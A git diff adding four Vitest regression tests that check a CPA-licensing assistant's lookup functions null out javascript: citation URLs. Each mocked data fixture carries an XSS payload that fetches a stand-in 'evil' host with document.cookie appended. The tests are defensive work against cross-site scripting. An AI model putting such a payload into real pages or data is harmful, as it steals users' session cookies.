@@ -274,4 +274,131 @@ describe("XSS-2 regression -- citation_url scheme guard is load-bearing, not jus
     vi.doUnmock("../src/cpe_hours.json");
     vi.resetModules();
   });
+
+  // TEST-12 (AuditLab, 2026-09-19): the TEST-11 filing asked for "one it()"
+  // and got exactly that -- covering only lookupAssistantCpe and the
+  // newsletter pass, 2 of the 6 newly-guarded sites. The other 4
+  // (lookupAssistantDeadlines, lookupAssistantReinstatement,
+  // lookupAssistantRenewalFee, lookupAssistantRuleChanges) stayed
+  // revert-green. Same doMock shape for each remaining site.
+  it("lookupAssistantDeadlines nulls a javascript: citation_url instead of passing it through", async () => {
+    vi.resetModules();
+    vi.doMock("../src/cpa_deadlines.json", () => ({
+      default: {
+        records: [
+          {
+            id: "xx-individual",
+            state: "Test State",
+            state_slug: "xx-test-state",
+            license_type: "individual",
+            license_type_label: "Individual CPA License",
+            cycle_description: "fixture",
+            next_deadline_computed: null,
+            data_gap_note: null,
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            last_verified: "2026-01-01",
+          },
+        ],
+      },
+    }));
+    const { lookupAssistantDeadlines } = await import("../src/assistant");
+    const result = lookupAssistantDeadlines("xx-test-state");
+    expect(result).toHaveLength(1);
+    expect(result[0]!.citation_url).toBeNull();
+    vi.doUnmock("../src/cpa_deadlines.json");
+    vi.resetModules();
+  });
+
+  it("lookupAssistantReinstatement nulls a javascript: citation_url instead of passing it through", async () => {
+    vi.resetModules();
+    vi.doMock("../src/reinstatement.json", () => ({
+      default: {
+        records: [
+          {
+            id: "xx-reinstatement",
+            state: "Test State",
+            state_slug: "xx-test-state",
+            reinstatement_fee_usd: null,
+            reinstatement_fee_notes: "fixture",
+            penalty_cpe_hours: null,
+            penalty_cpe_notes: null,
+            penalty_ethics_hours: null,
+            lapse_trigger: "fixture",
+            data_gap_note: null,
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            last_verified: "2026-01-01",
+          },
+        ],
+      },
+    }));
+    const { lookupAssistantReinstatement } = await import("../src/assistant");
+    const result = lookupAssistantReinstatement("xx-test-state");
+    expect(result).not.toBeNull();
+    expect(result!.citation_url).toBeNull();
+    vi.doUnmock("../src/reinstatement.json");
+    vi.resetModules();
+  });
+
+  it("lookupAssistantRenewalFee nulls a javascript: citation_url instead of passing it through", async () => {
+    vi.resetModules();
+    vi.doMock("../src/renewal_fees.json", () => ({
+      default: {
+        records: [
+          {
+            id: "xx-renewal-fee",
+            state: "Test State",
+            state_slug: "xx-test-state",
+            fee_usd: 100,
+            fee_notes: "fixture",
+            fee_basis: "board_schedule",
+            confidence: "dual_source",
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            verified_date: "2026-01-01",
+          },
+        ],
+      },
+    }));
+    const { lookupAssistantRenewalFee } = await import("../src/assistant");
+    const result = lookupAssistantRenewalFee("xx-test-state");
+    expect(result).not.toBeNull();
+    expect(result!.citation_url).toBeNull();
+    vi.doUnmock("../src/renewal_fees.json");
+    vi.resetModules();
+  });
+
+  it("lookupAssistantRuleChanges nulls a javascript: citation_url instead of passing it through", async () => {
+    vi.resetModules();
+    vi.doMock("../src/reg_change_events.json", () => ({
+      default: {
+        events: [
+          {
+            event_id: "xx-regwatch-test12",
+            jurisdiction_slug: "xx-test-state",
+            jurisdiction: "Test State",
+            topic: "CPA regulatory/statutory change",
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            verified_date: "2026-01-01",
+            confidence: "dual_source",
+            summary_public: "fixture",
+            kind: "rule_change",
+            effective_date: null,
+            status: "PROPOSED",
+            upcoming: false,
+            needs_reverification: false,
+            source: "difflab_reg_change_engine",
+          },
+        ],
+      },
+    }));
+    const { lookupAssistantRuleChanges } = await import("../src/assistant");
+    const result = lookupAssistantRuleChanges("xx-test-state");
+    expect(result).toHaveLength(1);
+    expect(result[0]!.citation_url).toBeNull();
+    vi.doUnmock("../src/reg_change_events.json");
+    vi.resetModules();
+  });
 });
